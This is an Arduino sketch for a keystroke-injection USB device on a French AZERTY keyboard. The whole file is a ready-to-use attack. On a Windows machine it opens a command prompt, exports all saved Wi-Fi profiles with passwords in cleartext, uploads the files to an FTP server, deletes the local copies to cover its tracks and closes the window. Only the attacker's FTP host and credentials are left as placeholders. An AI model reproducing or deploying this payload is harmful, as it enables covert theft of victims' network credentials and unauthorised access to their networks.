// You can set yourself the delay you want by testing, the delay here is always the same.

#include <KeyboardAzertyFr.h>

// Init function
void setup()
{
  // Begining the stream
  KeyboardAzertyFr.begin();
  
  // Waiting 500ms for init
  delay(500);

  delay(3000);

  // Press Windows + r
  KeyboardAzertyFr.press(KEY_LEFT_GUI);
  KeyboardAzertyFr.press('r');
  KeyboardAzertyFr.releaseAll();

  delay(100);

  // Print
  KeyboardAzertyFr.print("cmd");
  typeKey(KEY_RETURN);

  delay(400);

  // Print (export profile)
  KeyboardAzertyFr.print("netsh wlan export profile key=clear");
  typeKey(KEY_RETURN);

  delay(400);

  // Print (change directory to %USERPROFILE%)
  KeyboardAzertyFr.print("cd %USERPROFILE%");
  typeKey(KEY_RETURN);
  
  delay(400);
  
  // Print (connection to ftp)
  KeyboardAzertyFr.print("ftp -i YOUR_FTP_HOST_HERE");
  typeKey(KEY_RETURN);

  delay(400);
  
  // Print (username ftp)
  KeyboardAzertyFr.print("YOUR_FTP_USERNAME_HERE");
  typeKey(KEY_RETURN);

  delay(400);
  
  // Print (password ftp)
  KeyboardAzertyFr.print("YOUR_FTP_PASSWORD_HERE");
  typeKey(KEY_RETURN);

  delay(400);

  // Print (put all .xml files to ftp server)
  KeyboardAzertyFr.print("MPUT *.xml");
  typeKey(KEY_RETURN);

  delay(800);

  // Print (exit ftp)
  KeyboardAzertyFr.print("bye");
  typeKey(KEY_RETURN);

  delay(400);

  // Print (delete all .xml files)
  KeyboardAzertyFr.print("del *.xml");
  typeKey(KEY_RETURN);

  delay(800);

  // Press ALT + F4 (close cmd)
  KeyboardAzertyFr.press(KEY_LEFT_ALT);
  KeyboardAzertyFr.press(KEY_F4);
  KeyboardAzertyFr.releaseAll();
}

void typeKey(int key)
{
  KeyboardAzertyFr.press(key);
  delay(50);
  KeyboardAzertyFr.release(key);
}

// Nothing here
void loop() {}
